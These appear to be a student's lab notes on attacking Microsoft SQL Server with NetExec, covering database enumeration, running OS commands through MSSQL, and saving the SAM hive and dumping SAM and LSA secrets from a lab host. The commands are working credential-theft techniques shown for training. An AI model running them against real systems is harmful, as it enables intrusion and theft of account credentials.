Two types of authentication
- Windows auth - default with NetExec
- Database auth - performed with `--local-auth`

Default databases
- master
- model
- msdb
- tempdb


**Enumeration**
enumerate existing databases
`nxc mssql <IP> -u <user> -p <pass> --database`

enumerate tables of a database
`nxc mssql <IP> -u <user> -p <pass> --database <db-name>`

execute manual SQL queries
`nxc mssql <IP> -u <user> -p <pass> --query "USE <db-name>; SELECT * FROM <table-name>"`





**Dumping Secrets with MSSQL**
to extract creds, the user must be sysadmin in MSSQL
- MSSQL must be running with admin privileges

since we can execute commands, we can extract SAM, SYSTEM, and SECRETS hives
- `reg save "HKLM\SAM" "C:\Windows\Temp\SAM"`
- download SAM (and SYSTEM) file
- parse SAM file locally with secretsdump

- automated with netexec
	- `nxc mssql <IP> -u <user> -p <pass> --sam`


### Learning Objective 21
**Extract SAM and LSA secrets from LINEOPS-DB01 machine using MSSQL**
enumerate MSSQL databases - also checks if we own them with current account
`nxc mssql 172.16.13.1-30 -u ryan.young -p <pass>`

check privileges mssql is running on
`nxc mssql 172.16.13.1-30 -u ryan.young -p <pass> -x whoami`
![](assets/Pasted%20image%2020260724110338.png)

`nxc mssql 172.16.13.1-30 -u ryan.young -p <pass> --sam --lsa`
![](assets/Pasted%20image%2020260724110359.png)
- check for users you don't have yet
